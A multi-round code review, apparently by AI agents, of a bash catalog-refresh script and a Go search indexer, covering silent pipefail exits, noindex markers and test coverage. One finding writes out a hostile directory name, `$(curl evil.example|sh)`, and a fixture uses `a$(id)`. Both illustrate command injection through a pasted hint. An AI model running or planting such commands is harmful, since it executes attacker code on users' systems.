---
owner: reviewer
date: 2026-10-01
---
# Review — catalog-plan-code   (2026-10-01)

Range reviewed: 754a7ce..working tree (vendored entries excluded)

Files: `internal/harness/catalog_test.go`, `internal/harness/size_test.go` (`TestSkillListingBudget`), `internal/harness/harness_test.go` (`isVendoredPath`, the `TestNoTmpInHarnessProse` walker), `internal/harness/skill_links_test.go`, `internal/harness/restatement_script_test.go`, `internal/search/reconcile.go`, `internal/search/search_test.go`, `skills/google-catalog/scripts/refresh-catalog.sh`, `skills/review/scripts/restatement-grep.sh` (`git diff 754a7ce --stat -- cmd internal skills/google-catalog/scripts skills/review/scripts`: 9 files, +1054/-2).

Checks run: `bash -n` on both scripts (exit 0); `go test -race ./internal/harness ./internal/search` (exit 0, both packages ran, not cached); `gofmt -l cmd internal` (empty); `go vet ./internal/harness ./internal/search` (exit 0). I reproduced finding 1 against the real script with two local fixture repositories under `.agents/scratch/review-catalog/`.

## Verdict: APPROVE WITH NITS (round 3; rounds 1 and 2 were REQUEST CHANGES)

The worst problem is in `refresh-catalog.sh`'s swap. The loop that removes the entries named in the old CHECKSUMS sits in a pipeline under `set -euo pipefail`. When the last entry it visits is not a directory, the loop returns 1, and the script exits 1 silently: it prints no message, it has already deleted every other entry, and it has copied nothing. I reproduced this. It is BUG-138's silent-exit shape, and it adds a partial-state write. The rest is low severity. A root-level `.sh-agent-noindex` does nothing. No test pins that the checked-in catalog keeps its marker. The script accepts entry names with whitespace, which break its space-separated bookkeeping. `gitView` lost its doc comment to the new constant. The nested write-mode test does not restore CHECKSUMS when the guard is broken. The Go side is otherwise sound. The checksum and index tests compare in both directions, `TestSkillListingBudget` measures what its comment says, and the noindex marker behaves as the spec says for every case except the repository root.

## Findings

- **[medium / confidence: high]** `skills/google-catalog/scripts/refresh-catalog.sh:225-228`: the swap loop `awk … | grep / | cut … | sort -u | while read -r old_entry; do …; [ -d "$dest/$old_entry" ] && rm -rf -- …; done` runs under `set -euo pipefail`.
  - **How it fails:** when the last name in sort order is not a directory in `--dest`, the `&&` list is the last command in the loop body and returns 1. The `while` loop then exits 1, `pipefail` passes that to the pipeline, and `set -e` ends the script.
  - **When it happens:** an operator removed one entry by hand, or an earlier swap stopped partway (for example `cp -R` on a full disk).
  - **Result:** exit 1 with no output, all the other entries already deleted, and `cp -R "$build/." "$dest/"` never reached.
  - **Reproduced:** fixture with entries alpha, beta, gamma and zeta. After `rm -rf dest/zeta`, a second run exited 1 with empty output, and `dest/` held only CHECKSUMS, INDEX.md, the LICENSEs, MANIFEST.md and `.sh-agent-noindex`. alpha, beta and gamma were gone.
  - **Second trigger:** a CHECKSUMS with no line containing `/` (an empty CHECKSUMS in a dest that passes the line-66 guard) makes `grep /` exit 1. The script then exits silently before the copy.
  - **Fix:** write the removal as `if [ -d … ]; then rm …; fi`. Collect the list with `… | { grep / || true; } | …`, or iterate over a captured variable instead of a pipeline. Add a fixture to `TestRefreshCatalogScript` that deletes the last-sorted entry from dest before a refresh, and assert exit 0 and the restored entries.
- **[low / confidence: medium]** `internal/search/reconcile.go:163-167`: a marker at the repository root is ignored. `path.Dir(".sh-agent-noindex")` is `"."`, so the prefix becomes `"./"`, which no git path starts with. The spec row (`specs/sh-agent/search.md:35`, "under a directory holding a `.sh-agent-noindex` file") and the README describe any directory, and the root is a directory. The concrete failure is a data-only checkout marked at its root, which is still fully indexed with no notice. Fix: decide on the root case, either honouring it (`"."` excludes everything) or saying in the spec that the root is not a valid place, and add a test either way.
- **[low / confidence: high]** `internal/harness/catalog_test.go:31` together with `skills/google-catalog/catalog/.sh-agent-noindex`: no test pins that the checked-in catalog carries the marker. CHECKSUMS deliberately leaves the marker out (`catalogHarnessFiles`), and `TestRefreshCatalogScript:524` checks only that the script writes it into a fixture dest. If the tracked marker is deleted, every test still passes, and search recall silently goes back to 0.596 (D22). Fix: when `CATALOG_DIR` is unset, assert in a catalog test that `<catalog>/.sh-agent-noindex` exists.
- **[low / confidence: medium]** `skills/google-catalog/scripts/refresh-catalog.sh:122-138`: an upstream entry name is not validated, and the script's bookkeeping is split on spaces.
  - **What breaks:** for a directory name with a space (or a newline), `origins.txt` (`$1`), the collision check (`awk '$1 == n'`), `count`, `after`, and the swap's `awk '{print $2}'` over CHECKSUMS all see only the first word.
  - **Consequences:** the duplicate-name refusal can be bypassed, and an old entry directory is never removed before `cp -R` merges into it, so stale files from the previous upstream version stay. `TestCatalogMatchesChecksums` would then report the extra file, but only after the destination has been changed.
  - **Exclusions:** the same splitting applies to `--exclude "a b"` and to the manifest names read by the unquoted `for name in $(sed …)` (line 104). This only over-excludes, because `excluded()` compares literally, so it injects no option or command.
  - **Fix:** refuse any entry name outside the Agent Skills name shape (`^[a-z0-9][a-z0-9-]*$`) with the same "(--exclude <name>)" message as the other refusals, and add a fixture.
- **[low / confidence: high]** `internal/search/reconcile.go:76-88`: `const noIndexMarker` is inserted between `gitView`'s doc comment and `func gitView`. The whole "gitView lists the checkout's current files … prefix limits it to one directory." block now documents the constant, and `gitView` has no doc comment. The describing text also still lists only "deleted paths, symlinks, submodules and secret-shaped names" as what is left out, and does not mention the marker. Under the global rule on describing text, the change's own text now misdescribes it. Fix: move the constant above the comment, and add the marker to `gitView`'s list.
- **[low / confidence: medium]** `internal/harness/catalog_test.go:317-325`: `TestCatalogWriteModeNeedsCatalogDir` detects a broken guard but leaves the damage in place. If the guard regresses while a vendored file is edited, the nested `go test` rewrites the checked-in CHECKSUMS to match the edit. This run fails, but it does not write `before` back, so the next `go test` is green: the integrity check has become its own answer, which the guard's comment names as the failure to prevent. Fix: on `!bytes.Equal(before, after)`, restore `before` with `os.WriteFile` before reporting. The nested run cannot recurse (`-run ^TestCatalogMatchesChecksums$`, and the test skips itself under `CATALOG_WRITE=1`), honours `-short`, and has no lock it could deadlock on.

## Criteria

1. **Dead code: pass.** The diff adds no unused helper. `isVendoredPath` has two callers (`TestNoTmpInHarnessProse` and `TestSkillLinksResolve`), and `noIndexMarker` is used. The script has no debug leftovers.
2. **Flow tracing: fail (finding 1).**
   - **Script to nested `go test`:** `--dest` and `--work` are made absolute before the child runs (BUG-146 holds). A failure in the nested writer stops the script before the swap, so `--dest` stays untouched, and the fixtures assert this.
   - **Manifest:** the rewrite is idempotent. A second run at the same pins gives a byte-identical snapshot, which the test asserts.
   - **Search:** `--refs` and plain queries read the same reconciled index, so they see the same filtering. The global index calls `gitView(root, ".agents/docs/")` and so sees only markers under the docs root. That has no effect on the catalog, but a marker above `.agents/docs/` would filter the project index and not the global one.
   - **Existing index:** an index built before the marker drops those rows on the next reconcile. The uncommitted-marker half of `TestNoIndexMarkerSkipsTheDirectory` asserts this, and the verifier log records a must-fail control.
   - **Checksum and index tests:** both compare in both directions (missing and extra paths; missing and extra lines, then order).
   - **Descriptions in the index:** a description containing a backtick is harmless, because the name is the backticked part. A newline from a block scalar is folded by `Parse` (gamma fixture), and the live INDEX.md has 136 `- \`` lines and no broken ones.
3. **Standards conformance: pass except finding 5.** `gofmt` and `go vet` are clean.
   - **Restatements:** the marker appears in README.md:192 and `specs/sh-agent/search.md:35`, and both match the code except the root case (finding 2). `restatement-grep.sh`'s header comment was updated with its regex.
   - **Bash 3.2 (refresh script):** process substitution `<( )` in `comm` is supported in bash 3.2. There is no `mapfile`, and `${var%/}` and `local` are fine.
   - **Bash 3.2 (pre-existing):** `restatement-grep.sh` already used `mapfile` (bash 4+) before this range. That is not introduced here, but the script does not run on macOS's stock bash.
4. **Directory layout: pass.** The script sits under the router skill's `scripts/`, the tests sit beside the package they exercise, and the marker logic is in `internal/search`.
5. **Simplicity (DIY-except-security): pass.** The script uses only stdlib tools and git. sha256 is used through `crypto/sha256` as designed, as a checksum, which is not hand-rolling. There are no new Go dependencies.
   - **Destination guard:** the `case` patterns cover `/`, `$HOME`, the checkout and their ancestors after trailing-slash normalisation. They do not normalise `..` or symlinks (`--dest $repo/skills/..` passes the `case`). The real backstop is the line-66 check that `--dest` is either empty or holds a CHECKSUMS.
   - **Swap deletions:** removal is limited to first path components named in that CHECKSUMS. `""`, `.`, `..` and absolute paths (whose first component is empty) are skipped, and a name starting with `-` is safe behind `--` and the `$dest/` prefix.
   - **`--work` (not filed):** `--work` itself is unguarded (`rm -rf "$work/build"`). The operator supplies it and it only removes `<work>/build`, so it is not filed.
6. **Decoupling: pass.** The marker is one constant and one filter in `gitView`, and the harness and search packages share nothing new. The catalog tests reach the installer only through its exported parser (`Split`, `Parse`, `Plan`, `LoadSkills`).

`TestSkillListingBudget`: `len(Name)+len(Description)` is the metric the comment names ("names and descriptions"), counted in bytes. The listing's per-line punctuation (a few bytes per skill, about 35 skills) is not counted, which the 300-byte margin below the measured 19,800 covers. `SlashOnly` is `disable-model-invocation: true`, which Claude Code leaves out of the model's listing, so it is the right filter. Catalog entries are nested one level deeper and are not loaded by `LoadSkills`, so they are correctly not counted.

## Not examined

- The vendored entries under `skills/google-catalog/catalog/<entry>/`, excluded by the dispatch.
- `INDEX.md`, `CHECKSUMS` and `MANIFEST.md` content, except a scan of INDEX.md line shapes.
- The docs changes in the working tree (README.md, AGENTS.md, VENDORED.md, delivery.md, the router SKILL.md). Those are for `/review --docs`.
- `harness_test.go` outside the `vendoredSkills`, `isVendoredPath` and `TestNoTmpInHarnessProse` region.
- Running the script on macOS bash 3.2 (judged by reading only), and the network path against real GitHub pins.

## Status: COMPLETE

## Outcome

Written by the main agent on 2026-10-01. Every fix was written test-first; the round 2 below is the reviewer's own check of them.

1. Swap loop exits silently half way (medium): fixed. The removal is `if [ -d … ]; then rm -rf -- …; fi` and the list is collected through `{ grep / || true; }`. `TestRefreshCatalogScript` has a fixture that deletes an entry directory from the destination before a refresh and asserts exit 0 and the restored entry; it failed before the fix with "a refresh over a catalog with a missing entry directory did not restore it (exit 1)".
2. Root marker ignored (low): fixed by honouring it. A marker at the checkout's root leaves the whole checkout out; `TestNoIndexMarkerSkipsTheDirectory` has the root case and `specs/sh-agent/search.md` says so.
3. No test for the tracked marker (low): fixed. `TestCatalogFilesAreCarryable` fails when `catalog/.sh-agent-noindex` is absent.
4. Entry names with whitespace (low): fixed. The script refuses a name outside `[a-z0-9-]` with the `--exclude <name>` hint; fixture "a name with a space".
5. Doc comment on the wrong declaration (low): fixed. The constant sits above the comment, and the comment names the marker among what is left out.
6. Nested write-mode test leaves a rewritten CHECKSUMS (low): fixed. A `t.Cleanup` writes the saved bytes back, and `catalogDir` refuses `CATALOG_DIR` without `CATALOG_WRITE=1`.

Not filed by the report and left: `--work` is not guarded (it removes only `<work>/build`), and the destination guard does not normalise `..` (the CHECKSUMS check is the backstop). Both are in the handoff's Next Steps as operator choices.

## Round 2

Reviewed 2026-10-01 (`date +%F`): the fixes as they stand in the working tree, in `refresh-catalog.sh`, `internal/search/reconcile.go`, `internal/search/search_test.go`, `internal/harness/catalog_test.go` and `specs/sh-agent/search.md:35`. Method: every fix was mutated on a COPY of the tree (`.agents/scratch/review-catalog-r2/copy`, tracked files untouched), each mutation proved to compile or parse (`bash -n`, `go test` ran) before its result is cited, and the baseline of the copy was green first (`TestRefreshCatalogScript` ok). The root-marker behaviour was run with a built binary in a scratch repository.

## Verdict (round 2): REQUEST CHANGES

Finding 1's code is fixed, but only one of its two triggers has a test; the second one (a CHECKSUMS with no `/` line) fails nothing when its fix is removed, so by the rule that a finding counts as fixed only when every trigger has a failing test, it is not fixed. The fix for finding 4 introduced a defect: the name check runs before the `--exclude` test, so an oddly named upstream entry cannot be excluded, and the Outcome's claim of an `--exclude <name>` hint is wrong.

### Round-1 findings

1. **Swap loop exits silently (medium): not fixed (code fixed, one trigger untested).** `refresh-catalog.sh:225-235`: `if [ -d … ]; then rm …; fi` and `{ grep / || true; }`.
   - Trigger A (last-sorted entry missing from dest): covered. `catalog_test.go:559-566` removes `gamma`, the last in sort order of alpha, beta, delta, epsilon, gamma, then asserts exit 0 and the restored snapshot. Mutation `[ -d … ] && rm …` on the copy: FAIL "a refresh over a catalog with a missing entry directory did not restore it (exit 1)".
   - Trigger B (CHECKSUMS with no line containing `/`): NOT covered. Mutation `{ grep / || true; }` to `grep /` on the copy: `TestRefreshCatalogScript` still ok. No fixture runs a refresh over a dest whose CHECKSUMS lacks an entry line. The trigger is real: `printf 'LICENSE-a\n' | grep / | …` under `set -euo pipefail` exits 1 without reaching the next command; with `|| true` it reaches it. Fix: add a fixture that writes a CHECKSUMS holding only `LICENSE-agents-cli` lines into a copy of dest and asserts exit 0.
2. **Root marker ignored (low): fixed.** `reconcile.go:166-174` maps `./` to the empty prefix; `search.md:35` says so. `search_test.go:677-684`: mutation removing the `dir == "./"` block FAILS with `vendor/beside.md` still in the output. Run with a binary: a committed root marker gives `search: 0 hits … index current: 0 files`, exit 0 (an empty index, not a failure). One residue: see new finding B.
3. **No test for the tracked marker (low): fixed.** `catalog_test.go:244-247`. Mutation (marker moved away in the copy): `TestCatalogFilesAreCarryable` FAILS ("the catalog has no .sh-agent-noindex marker"). The marker is tracked (`git ls-files` lists it).
4. **Entry names with whitespace (low): fixed with a new defect.** `refresh-catalog.sh:122-127` and fixture `catalog_test.go:647`. Mutation neutralising the `case` pattern: the fixture run vendored `bad name` and the suite FAILS (the following fixtures cascade). The new defect is finding A below.
5. **Doc comment on the wrong declaration (low): fixed.** `reconcile.go:77-89`: the constant sits above the `gitView` comment, which now names the marker. (The comment's "every path under a directory that holds a marker" does not hold above the prefix of the global index, see B.)
6. **Nested write-mode test leaves CHECKSUMS rewritten (low): fixed.** `catalog_test.go:324-340`. With the guard broken in the copy (`if false`) and a vendored file edited: the test FAILS and the `t.Cleanup` leaves CHECKSUMS byte-identical (`cmp` equal); with the Cleanup line deleted the file stays rewritten. The restore is therefore effective. No committed test can fail without the Cleanup (it needs a broken guard), so it is verified by this mutation only. Ordering: `cmd.CombinedOutput` returns only after the nested `go test` exits and Cleanup runs after the test function, so the restore cannot race the nested run; the nested run is not parallel with other tests of the package.

### New findings

- **[low / confidence: high]** A. `refresh-catalog.sh:122-127` (A: name check) before `:128` (`excluded "$name" && continue`): the name check fires before the `--exclude` test, so `--exclude <odd name>` cannot clear it; one upstream directory with an uppercase letter, dot or underscore blocks every refresh until the script is edited. The message has no `--exclude` hint either, contrary to the Outcome (item 4). `excluded()` compares literally and is safe to run first. The fixture (`catalog_test.go:647`) passes `exclude ""`, so it pins the dead end. The failure is closed (nothing is written), hence low. Fix: test `excluded` first, and give the fixture `exclude "bad name"` (the `refuse` helper then asserts that the exclusion clears it). The real catalog has no such name today (all 141 match `^[a-z0-9][a-z0-9-]*$`).
- **[low / confidence: high]** B. `reconcile.go:99-100` with `gitView(root, ".agents/docs/")`: `under()` filters the view before the marker scan, so a root marker (or any marker above the docs root) is never seen by the global index. Run: with a committed root marker, project `search` finds 0 hits while `search --global` still returns `proj:.agents/docs/p.md`. `search.md:35` says a root marker "leaves the whole checkout out" in the Project row only, and the global row is unqualified, so the docs do not say the trail is still served. Whether that is wanted is the operator's choice; either way, a sentence in the global row (or the marker scan before `under`) closes it. No test covers the global index with a root marker.
- **[low / confidence: medium]** C. `catalog_test.go:57-61` (the `CATALOG_DIR` without `CATALOG_WRITE=1` refusal, "security review T1"): no test fails when it is removed (mutated to `if false` in the copy; the suite stays green, since no test sets `CATALOG_DIR` alone). The guard works by reading; it has no must-fail evidence. Fix: a small test that runs the nested `go test` with `CATALOG_DIR=<tmp>` and no `CATALOG_WRITE` and expects the refusal text.

### Checks of the specific concerns

- `set -euo pipefail` exits in the new script lines: none found beyond trigger B's shape. The `[ -n … ] || fail`, `case`, `for pin`, `[ ! -L … ] || fail`, `ex=$(printf … | sort -u | tr …)` and the swap `if` all end in a status the list tolerates; `${HOME%/}` under `set -u` prints a message if HOME is unset (not silent).
- `catalogDir`'s refusal against the script's own call (`CATALOG_DIR=$build CATALOG_WRITE=1`, `refresh-catalog.sh:164-165`): compatible; the nested set `MatchesChecksums|IndexMatchesEntries|FilesAreCarryable` passes with the marker written before it (`:161`) and the fixture happy path is green in the copy.
- Root marker in a checkout whose root holds it: `sh-agent search`, `index` answer with an empty index, exit 0 (not a failure).

### Findings by severity

high 0, medium 0 (finding 1 stays open as a test gap, medium to low), low 3 new (A, B, C); round-1 findings not fixed: 1 (trigger B untested).

### Not examined (round 2)

The vendored entries, `INDEX.md`/`CHECKSUMS` content, the macOS bash 3.2 run, the network path against real GitHub pins, and the full suite on the live tree (the verifier owns it; my runs were on the copy and covered `TestRefreshCatalogScript`, `TestCatalog*`, `TestNoIndexMarkerSkipsTheDirectory`).

## Outcome (round 2)

Written by the main agent on 2026-10-01, after the round 2 above and the verifier's log `testing/2026-10-01-verify-google-skills-catalog-final.md`. Each new test was run red first or, where the fix already stood, against the fix removed on a saved copy that was restored and compared byte for byte.

1. Round-1 finding 1, trigger B (a CHECKSUMS naming no entry) had no test: fixed. `TestRefreshCatalogScript` refreshes over a destination holding only an empty CHECKSUMS; with `{ grep / || true; }` put back to `grep /` it fails with "a refresh over a destination whose CHECKSUMS names no entry failed: exit status 1".
2. The name check ran before the exclusion and its message had no hint (low): fixed. The exclusion is tested first, the message ends `(--exclude "<name>")`, and two fixtures (a name with a space, a name with a capital) assert the hint and that `--exclude` clears the refusal. Both were red before the change.
3. A root marker left `search --global` serving the docs trail (low): fixed. Markers are collected from the whole checkout before the prefix filter, so a marker above the prefix covers it; `TestNoIndexMarkerSkipsTheDirectory` asserts an empty prefixed view (red first: "a root marker left 1 entries in a prefixed view"), and `specs/sh-agent/search.md` names both indexes.
4. The `catalogDir` refusal had no test (low): fixed. `TestCatalogWriteModeNeedsCatalogDir` runs the nested test with `CATALOG_DIR` set and no write mode; with the refusal removed it fails ("CATALOG_DIR without CATALOG_WRITE=1 was accepted").
5. The verifier's two coverage gaps: closed. Six destination cases (`/`, the home directory with and without a trailing slash, the checkout, an ancestor of the checkout, an ancestor of the home directory) each assert the guard's own message; with the three guard cases removed all six fail, because the not-a-catalog check answers with another message. The capital-letter fixture covers the name rule beyond a space.


## Round 3

Reviewed 2026-10-01 (`date +%F`).

Range reviewed: 754a7ce..7dd0645 (vendored entries excluded)

The round-2 fixes were read through `git diff b0789f1..7dd0645` and `git show 7dd0645:<path>`, never in the working tree, because a verifier was running on it at the same time. Every mutation was made on a copy of 7dd0645 (`git archive 7dd0645 | tar -x` into `.agents/scratch/review-catalog-r3/copy`). Before each edit I counted the target text (exactly one occurrence). I ran `bash -n` on each script mutation. Each mutated copy compiled and the named test ran. I restored each file from a saved copy and checked it with `cmp`. Baseline on the copy: `TestNoIndexMarkerSkipsTheDirectory`, `TestRefreshCatalogScript` and `TestCatalogWriteModeNeedsCatalogDir` all ok. The full `./internal/search` package fails `TestGlobalRebuildDropsRegistry` and `TestRefuseOutsideCheckout` on the UNMUTATED copy too. The cause is the environment: TMPDIR was inside the harness checkout, so "outside a checkout" is not outside one. Those two failures are therefore not counted as evidence below.

## Verdict (round 3): APPROVE WITH NITS

All four round-2 items are fixed. A mutation run on the copy shows that each trigger now has a test that fails without its fix. Nothing in the range is broken at medium or high severity. The fixes brought four low findings:

- The new "a marker deleted from the work tree no longer counts" branch in `gitView` has no test. Removing it leaves the whole search package green.
- `--exclude "bad name"` also excludes the entries `bad` and `name`, silently when either is new upstream.
- The new refusal hint puts an upstream-chosen directory name inside a double-quoted command that the operator is invited to paste.
- The six destination cases run the real script against `/` and the real checkout, with working fixture sources behind them.

### Round-2 items

1. **Finding 1, trigger B (CHECKSUMS naming no entry): fixed.** Mutation `{ grep / || true; }` to `grep /` (`refresh-catalog.sh:236`). Result: `TestRefreshCatalogScript` FAILS at `catalog_test.go:584`, "a refresh over a destination whose CHECKSUMS names no entry failed: exit status 1". Trigger A is still covered by `:572` (round 2). Both triggers now have failing tests.
2. **Name check runs before the exclusion (A): fixed with a new defect.** Mutation: `excluded "$name" && continue` moved back below the `case` (`:126` to after `:133`). Result: FAILS at `catalog_test.go:692` ("name with a space: --exclude bad name did not clear the refusal (exit 1)") and `:693` ("uppercase name: --exclude Loud …"). The hint `(--exclude "<name>")` is asserted by the `refuse` label argument. The header comment (`:17-21`) and the manifest skeleton sentence ("the refresh script reads this list and excludes each name on every run") match the code. The new defects are findings R3-2 and R3-3.
3. **Global index under a root marker (B): fixed with a new untested branch.** Mutation: marker collection gated by `under(p)` in both loops (`reconcile.go:111`, `:142`). Result: FAILS at `search_test.go:693`, "a root marker left 1 entries in a prefixed view, first vendor/beside.md". `search.md:35` now names both indexes, which matches the code. The new deletion branch (`:143-144`) is finding R3-1.
4. **`catalogDir` refusal untested (C): fixed.** Mutation: the `t.Fatal("CATALOG_DIR is only for …")` at `catalog_test.go:56` replaced with `_ = 0`. Result: `TestCatalogWriteModeNeedsCatalogDir` FAILS at `:343`, "CATALOG_DIR without CATALOG_WRITE=1 was accepted". The second half compares an empty `t.TempDir()`, so it writes nothing.

### Findings (round 3)

- **[low / confidence: high]** R3-1. `internal/search/reconcile.go:142-148`: the branch "a marker deleted from the work tree no longer counts" (`y == 'D' || err != nil` leading to `delete(markers, p)`) has no test.
  - **Why it is needed:** round 2 took markers from `view`, which already dropped deleted paths. Markers are now collected from `git ls-files` before the work tree is checked, so this branch alone stops a tracked marker that was `rm`'d (status ` D`) from hiding its directory.
  - **Mutation:** `delete(markers, p) …` replaced with a comment. `./internal/search` stays green, apart from the two environmental failures that also fail at baseline.
  - **Probe:** a test in the copy, removed afterwards, commits a marker and then removes the file. It passes on 7dd0645 and FAILS with the mutation ("a tracked marker deleted from the work tree still counts").
  - **Fix:** in `TestNoIndexMarkerSkipsTheDirectory`, delete the committed `vendor/data/.sh-agent-noindex` from the work tree and assert that `vendor/data/a/entry.md` is found again.
  - **Owner:** main agent, now. It is about six lines.
- **[low / confidence: high]** R3-2. `refresh-catalog.sh:46,105,115`: exclusions are one space-separated string, so a name with a space excludes each of its words as well.
  - **The words are excluded too:** `--exclude "bad name"` gives `excludes=" bad name"`, and `excluded bad` and `excluded name` both return 0. I demonstrated this with the script's own `excluded()`.
  - **When it is silent:** if `name` is a NEW upstream entry, it is never vendored and nothing reports it. The closing `excluded:` line prints `bad name`, which reads as the operator's own words. If `name` was already vendored, it shows only as `removed: name`.
  - **It persists:** recording the name under the manifest's `## Excluded` (as the header asks) makes every later refresh drop `bad` and `name` too. `TestCatalogExcludedEntriesAreAbsent` checks only that the directory `bad name` is absent, so it cannot see this.
  - **Glob expansion:** the manifest loop `for name in $(sed …)` is unquoted, so a recorded name with a glob character (`skill?`) expands against the caller's directory (for example to `skills`). The odd entry then stops being excluded, and the refresh refuses again. This fails closed.
  - **Fix:** keep exclusions newline-separated and test them with `grep -Fxq`, reading the manifest with `while IFS= read -r`. Alternatively, skip names outside `[a-z0-9-]` with a printed `skipped: <name>` line instead of refusing them, so no `--exclude` is ever needed for them.
  - **Owner:** operator choice. If it is left open, it goes in the handoff's Next Steps. The real catalog has no such name today.
- **[low / confidence: medium]** R3-3. `refresh-catalog.sh:132`: the hint `(--exclude \"$name\")` prints an upstream-controlled directory name inside double quotes, as a flag to paste into a shell. A name such as `$(curl evil.example|sh)` contains no `/`, so it is a valid directory name. It reaches exactly this message, because the name check is what refuses it. Pasted, it runs a command chosen by upstream. Before round 2 this refusal had no hint, and the other `--exclude $name` hints are reached only by plain names.
  - **Fix:** print the name with `printf %q` (bash 3.2 has it), or give no paste-ready flag for a name holding a character outside `[A-Za-z0-9._ -]`.
  - **Owner:** main agent. This is security-adjacent, so the security agent should see the fix.
- **[low / confidence: high]** R3-4. `catalog_test.go:614-627`: the six destination cases run the real script with `--dest /` and `--dest <the checkout>` (and its parent). The fixture source repositories are valid, so nothing but the guard stands between the test and a full run.
  - **If only the `case` guards regress:** the not-a-catalog check (`:67`) still refuses every case, because none of these directories is empty and none holds a CHECKSUMS. The swap's removal also runs only when `$dest/CHECKSUMS` exists, so nothing is deleted.
  - **If both regress:** the fixture fetch, build and nested `go test` succeed, and `cp -R "$build/." "$dest/"` writes `alpha/`…`epsilon/`, `CHECKSUMS`, `INDEX.md`, `MANIFEST.md`, two `LICENSE-*` files and `.sh-agent-noindex` into the root of the real checkout. The root marker then silently empties the project's search index. Run as root (`sudo go test`, a container), it writes the same into `/`. The test reports the failure, but the checkout is left changed.
  - **Fix:** run these six cases with `CATALOG_AGENTS_CLI_REPO`/`CATALOG_GOOGLE_SKILLS_REPO` pointing at a path that does not exist. Every guard runs before `fetch`, so the assertions are unchanged, and a regressed guard then ends at "cannot clone" before any write.
  - **Owner:** main agent, now.

### Checks of the named concerns that found nothing

- **(2) Sibling marker:** markers become `dir + "/"`, so a marker in `vendor/` or in `.agents/doc/` does not touch `.agents/docs/`. The probe on the copy confirmed this: a prefixed view of `.agents/docs/` kept `p.md` with both sibling markers present.
- **(2) Marker staged for deletion:** `git rm` gives `D `, the file is gone, Lstat errors, and the marker no longer counts. `git rm --cached` with the file kept still counts, as an untracked marker, which is consistent with "not yet added" in `search.md:35`.
- **(2) Symlink marker:** a tracked or untracked symlink named `.sh-agent-noindex` (even a dangling one) now counts. The probe confirmed it: `data/y.md` is not indexed. In round 2 it did not count, because `view` skipped mode 120000. The effect is only less indexing, so it is not filed. The spec says "file", and the operator may want a sentence.
- **(4) Can a failing test leave the checkout changed:**
  - `TestCatalogWriteModeNeedsCatalogDir`'s Cleanup rewrites CHECKSUMS from the saved bytes on every path. The nested run is limited to `^TestCatalogMatchesChecksums$`, so INDEX.md is never written, and the second half writes nothing.
  - The manifest-exclusion, bare-dest, symlink and LICENSE fixtures all live under `t.TempDir()`.
  - The only route to the checkout is R3-4.

### Findings by severity (round 3)

high 0, medium 0, low 4 (R3-1, R3-2, R3-3, R3-4). All round-1 and round-2 findings are now fixed. Open items I would leave at the cap are R3-2 (operator choice) and any of R3-1, R3-3 or R3-4 not fixed in the closing commit (main agent).

### Criteria (round 3)

1. **Dead code: pass.** Nothing is left behind. The old manifest "note:" loop was removed, and its role is now the merge at `:104-108`.
2. **Flow tracing: pass except R3-1 (untested branch).** Markers go from ls-files and status to `marked` to `noIndex`. The global caller `gitView(root, ".agents/docs/")` now sees markers above the prefix.
3. **Standards conformance: pass.** The describing text was updated with the code (`gitView` comment, `search.md:35`, script header, manifest skeleton). I did not re-run gofmt or vet; the verifier owns them.
4. **Directory layout: pass.**
5. **Simplicity (DIY-except-security): pass.** No dependency was added and nothing is hand-rolled. R3-3 concerns output escaping, not crypto.
6. **Decoupling: pass.** The changes stay inside `gitView` and the script.

### Not examined (round 3)

- The vendored entries, and the content of `INDEX.md`, `CHECKSUMS` and `MANIFEST.md`.
- The docs-only parts of 7dd0645 (README, AGENTS.md, VENDORED.md, delivery.md, router SKILL.md).
- The macOS bash 3.2 run and the network path.
- The full test suite on the live tree (the verifier's).
- R3-3 was judged by reading only. I did not create an upstream directory named with `$(…)`.
- R3-4's both-guards-regressed outcome was traced by reading only, not run, because running it would write into a checkout.
- `go test ./internal/search` on the copy could not give a clean full-package baseline (two environmental failures, see the method above).

## Outcome (round 3)

Written by the main agent on 2026-10-01. Round 3 was the last round; all four lows are fixed, none is left open.

- R3-1 (the deleted-marker branch had no test): fixed. `TestNoIndexMarkerDeletedCountsNoMore` in `internal/search/search_test.go` removes a committed marker from the work tree and expects the directory back in the index; with `delete(markers, p)` taken out it fails ("a marker deleted from the work tree still hides its directory"), restored and compared against the commit.
- R3-2 (`--exclude "bad name"` also excluded `bad` and `name`): fixed, not left to the operator. The exclusion list is one name per line (`--exclude` and the manifest merge both), and a name is compared whole. `TestRefreshCatalogScript` excludes a directory named `delta epsilon` and expects the entries `delta` and `epsilon` vendored; red before the change ("excluding "delta epsilon" also excluded the entry delta").
- R3-3 (the hint printed an upstream name inside double quotes): fixed. The hint is `printf %q` of the name; fixtures assert `(--exclude bad\ name)`, `(--exclude Loud)` and, for a directory named `a$(id)`, `(--exclude a\$\(id\))`. Red before the change.
- R3-4 (the six destination cases ran with working sources): fixed. Those cases point both source variables at a path that does not exist, so a run that got past both checks would stop at the clone.

Verification after these fixes: `gofmt -l cmd internal` empty, `go vet ./...`, `go test -race -count=1 ./...` all six packages ok (main agent), then the gate's verifier over the commit that carries them.
